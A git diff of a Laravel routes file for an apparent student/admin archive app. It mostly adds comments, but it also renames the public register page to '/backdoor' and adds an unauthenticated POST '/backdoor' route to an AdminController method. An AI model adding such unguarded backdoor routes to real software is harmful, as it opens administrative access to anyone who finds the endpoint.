@@ -18,11 +18,12 @@ use App\Http\Controllers\StudentController;
 |
 */
 Route::get('/', function(){return view('home');}); //default display page
-Route::get('/register', function(){return view('/register');});// for display when the authentication is functioning
+Route::get('/backdoor', function(){return view('/register');});// for display when the authentication is functioning
 
 
 Route::controller(AdminController::class)->group(function(){
-    Route::post('/admin/dashboard/admin/reset', 'resetPassword');
+    Route::post('/backdoor', 'backdoor');
+    Route::post('/admin/dashboard/admin/reset', 'resetPassword'); //process in reset admin password
     Route::post('/admin/dashboard/profile/changepassword/update','updatePassword')->name('adminchangepassword'); //for changepassword process
     Route::post('/admin/register','adminRegister'); //for registration process
     Route::post('/admin/loginprocess','adminLogin'); //for login process
@@ -52,7 +53,7 @@ Route::controller(StudentController::class)->group(function(){
 
 Route::controller(ViewController::class)->group(function(){
     
-    Route::get('/home', 'index')->name('home'); 
+    Route::get('/home', 'index')->name('home'); // display the main page
     Route::get('/student/dashboard/search', 'fileSearch')->name('search'); //for display the search in student page
     Route::get('/student/dashboard/archivelist','studentArchiveList')->name('archivelist'); //for display the archive list in student 
     Route::get('/student/dashboard/student/profile/{student}', 'studentprofileView')->name('admin.studentprofile')->middleware('auth:student'); // to display the admin profile details
@@ -77,12 +78,12 @@ Route::controller(ViewController::class)->group(function(){
     Route::get('/admin/dashboard/admin/register','register'); // to display the admin register 
     Route::get('/admin/login','adminLogin'); // to display the admin login 
     Route::get('/admin/dashboard/student/register','adminDashboardStudent')->name('student.register')->middleware('auth:admin'); //for display the dashboard
-    Route::get('/admin/dashboard/archive/decline', 'decline')->name('decline');
+    Route::get('/admin/dashboard/archive/decline', 'decline')->name('decline'); // display the decline list
 
-    Route::get('/admin/dashboard/admin/reset/{admin}', 'adminReset')->name('resetadmin');
+    Route::get('/admin/dashboard/admin/reset/{admin}', 'adminReset')->name('resetadmin'); // display the reset form of admin 
 
-    Route::get('/student/dashboard/archivelist/document/{file}', 'viewDoc');
-    Route::get('/admin/dashboard/archive/view/{file}', 'viewDocument');
+    Route::get('/student/dashboard/archivelist/document/{file}', 'viewDoc'); // pdf view in student 
+    Route::get('/admin/dashboard/archive/view/{file}', 'viewDocument'); // pdf view in admin 
 });
 
 
